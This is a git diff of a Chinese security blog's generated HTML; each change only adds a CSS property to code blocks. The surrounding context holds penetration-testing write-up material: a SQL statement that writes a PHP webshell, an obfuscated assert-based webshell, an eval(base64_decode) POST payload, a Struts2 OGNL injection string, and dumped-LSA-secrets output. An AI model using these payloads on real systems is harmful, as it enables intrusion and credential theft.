 &lt;h3 id="通用安装方法"&gt;通用安装方法&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pip install virtualenv
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pip install virtualenv
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="ubuntukalidebian"&gt;Ubuntu/Kali/Debian&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;apt-get upgrade &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get update
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;apt-get upgrade &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get update
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;apt-get install virtualenv
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x02-virtualenv-使用"&gt;0x02 virtualenv 使用&lt;/h2&gt;
 &lt;h3 id="帮助信息"&gt;帮助信息&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ virtualenv -h
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ virtualenv -h
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Usage: virtualenv &lt;span style="color:#f92672"&gt;[&lt;/span&gt;OPTIONS&lt;span style="color:#f92672"&gt;]&lt;/span&gt; DEST_DIR
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Options:
@@ -4737,10 +4737,10 @@ Ping命令都不让用，限制很死。&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; --distribute 已废弃
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; --unzip-setuptools 已废弃
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="查看当前版本"&gt;查看当前版本&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ virtualenv --version
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ virtualenv --version
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;16.0.0
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="配置一个新的环境"&gt;配置一个新的环境&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ which python &lt;span style="color:#75715e"&gt;# 查看Python路径&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ which python &lt;span style="color:#75715e"&gt;# 查看Python路径&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/bin/python
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;~$ virtualenv --no-site-packages -p /usr/bin/python MyNewEnv &lt;span style="color:#75715e"&gt;# 创建环境目录&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Running virtualenv with interpreter /usr/bin/python
@@ -5020,7 +5020,7 @@ SMB 192.168.3.5 445 LIYINGZHEA30B [+] Dumped 5 LSA secrets to /root/.cme/logs/LI
 &lt;p&gt;刚才百科告诉我们，套接字用（IP地址：端口号）表示。&lt;/p&gt;
 &lt;p&gt;那么在网络编程中如何告诉计算机，什么是端口，什么是端口号呢？&lt;/p&gt;
 &lt;p&gt;于是出现了被计算机界公认的结构体，这个结构体保存在系统的标准库中：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;arpa/inet.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; sockaddr_in
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
@@ -5099,7 +5099,7 @@ deb http://security.ubuntu.com/ubuntu artful-security multiverse
 &lt;p&gt;/usr/include/netinet/ip.h&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;这里面定义了IP头&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ip&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ip&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#if __BYTE_ORDER == __LITTLE_ENDIAN
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;unsigned&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; ip_hl:&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;;		&lt;span style="color:#75715e"&gt;/* header length */&lt;/span&gt;
@@ -5202,7 +5202,7 @@ deb http://security.ubuntu.com/ubuntu artful-security multiverse
 &lt;li&gt;开放端口 - 发现开启了防火墙&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;扫描到它存在&lt;code&gt;phpMyadmin&lt;/code&gt;，弱口令登录进入，通过常规手法SQL写入shell。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;INTO&lt;/span&gt; OUTFILE &lt;span style="color:#e6db74"&gt;&amp;#39;D:/WWW/***/master/&amp;#39;&lt;/span&gt;;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;INTO&lt;/span&gt; OUTFILE &lt;span style="color:#e6db74"&gt;&amp;#39;D:/WWW/***/master/&amp;#39;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;D:\WWW\***\master\&amp;gt; net user /domain
 这项请求将在域 WORKGROUP 的域控制器处理。
@@ -5274,7 +5274,7 @@ D:\WWW\***\master\&amp;gt; netstat -ano
 &lt;li&gt;msf &amp;amp;&amp;amp; CVE-2017-11882.rb&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;CVE-2017-11882.rb内容如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-ruby" data-lang="ruby"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;##&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-ruby" data-lang="ruby"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;##&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# This module requires Metasploit: https://metasploit.com/download&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Current source: https://github.com/rapid7/metasploit-framework&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;##&lt;/span&gt;
@@ -5388,7 +5388,7 @@ D:\WWW\***\master\&amp;gt; netstat -ano
 &lt;p&gt;于是我猜想会不会服务器端没有验证呢？&lt;/p&gt;
 &lt;p&gt;使用Burp提交后还是失败 :(&lt;/p&gt;
 &lt;p&gt;先不管这个，第一步就要把所有的信息搜集完毕再说。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;$&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;#register&amp;#34;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;bind&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;click&amp;#39;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;(){
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;usernameObj&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;$&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;#username&amp;#34;&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;passwordObj&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;$&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;#password&amp;#34;&lt;/span&gt;);
@@ -5525,7 +5525,7 @@ make install
 &lt;p&gt;生成证书后，此证书会被保存在当前用户主目录下。&lt;/p&gt;
 &lt;h2 id="0x01-修改配置文件"&gt;0x01 修改配置文件&lt;/h2&gt;
 &lt;p&gt;找到tomcat目录下的&lt;code&gt;conf/server.xml&lt;/code&gt;，将原来的&lt;code&gt;Connector &lt;/code&gt;更改一下即可。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!--
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!--
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; &amp;lt;Connector port=&amp;#34;8443&amp;#34; protocol=&amp;#34;HTTP/1.1&amp;#34; SSLEnabled=&amp;#34;true&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
@@ -5535,7 +5535,7 @@ make install
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; --&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;改成：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;Connector&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;port=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;端口&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;protocol=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;org.apache.coyote.http11.Http11Protocol&amp;#34;&lt;/span&gt; 
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;Connector&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;port=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;端口&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;protocol=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;org.apache.coyote.http11.Http11Protocol&amp;#34;&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;maxThreads=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;150&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;SSLEnabled=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;true&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;scheme=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;secure=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;true&amp;#34;&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;clientAuth=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;false&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;sslProtocol=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;TLS&amp;#34;&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;keystoreFile=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;keystore文件路径&amp;#34;&lt;/span&gt; 
@@ -5547,7 +5547,7 @@ make install
 &lt;h2 id="0x01-第一弹-安装程序getshell"&gt;0x01 第一弹 安装程序Getshell&lt;/h2&gt;
 &lt;p&gt;首先我们一般都是在安装的时候，看看有没有重装的可能性，粗略的看了一下代码并没有，但是存在一个有趣的安装getshell问题。&lt;/p&gt;
 &lt;p&gt;CI框架的数据库配置在：&lt;code&gt;config\database.php&lt;/code&gt;,其常见内容如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;defined&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;BASEPATH&amp;#39;&lt;/span&gt;)) &lt;span style="color:#66d9ef"&gt;exit&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;No direct script access allowed&amp;#39;&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -5582,7 +5582,7 @@ make install
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;然后找到这个界面对应的代码 &lt;code&gt;diy\dayrui\controllers\Install.php&lt;/code&gt;：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;/**
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; * 安装程序
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; */&lt;/span&gt;
@@ -5988,7 +5988,7 @@ Ncat: Connection from 172.17.0.2:48004.
 &lt;/ul&gt;
 &lt;p&gt;Bypass Shell 具体可以点击这里寻找：&lt;a href="https://code.csdn.net/payloads/webshell/tree/master/PHP/20170526_bypass"&gt;Bypass Shell&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;Shell Code&lt;/code&gt; 如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$___Ss &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;chr&lt;/span&gt;((&lt;span style="color:#ae81ff"&gt;97&lt;/span&gt; &lt;span style="color:#f92672"&gt;^&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;); &lt;span style="color:#75715e"&gt;//[a]
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$___Ss &lt;span style="color:#f92672"&gt;.=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;chr&lt;/span&gt;((&lt;span style="color:#ae81ff"&gt;115&lt;/span&gt; &lt;span style="color:#f92672"&gt;^&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;); &lt;span style="color:#75715e"&gt;//[s]
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$___Ss &lt;span style="color:#f92672"&gt;.=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;chr&lt;/span&gt;((&lt;span style="color:#ae81ff"&gt;115&lt;/span&gt; &lt;span style="color:#f92672"&gt;^&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;); &lt;span style="color:#75715e"&gt;//[s]
@@ -6048,7 +6048,7 @@ username=@eval(base64_decode($_POST[action]));&amp;amp;action=QGluaV9zZXQoImRpc3
 &lt;pre tabindex="0"&gt;&lt;code&gt;%{(#nikenb=&amp;#39;multipart/form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(&amp;#39;YES&amp;#39;)).(#o.close())}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到有一个YES，当服务器端相应YES的时候，我们就判定这个服务器存在此漏洞。&lt;/p&gt;
 &lt;p&gt;根据官方的文档，我们先载入指定的扩展库：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;--&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;-- Created by IntelliJ IDEA.&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;-- User: liyingzhe&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;-- Date: 17-6-3&lt;/span&gt;
@@ -6062,7 +6062,7 @@ username=@eval(base64_decode($_POST[action]));&amp;amp;action=QGluaV9zZXQoImRpc3
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;local&lt;/span&gt; vulns &lt;span style="color:#f92672"&gt;=&lt;/span&gt; require &lt;span style="color:#e6db74"&gt;&amp;#34;vulns&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这些基本用于发送HTTP请求、字符串操作、漏洞结果生成、错误调试&lt;/p&gt;
 &lt;p&gt;添加一个漏洞描述 ：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;description &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;[[
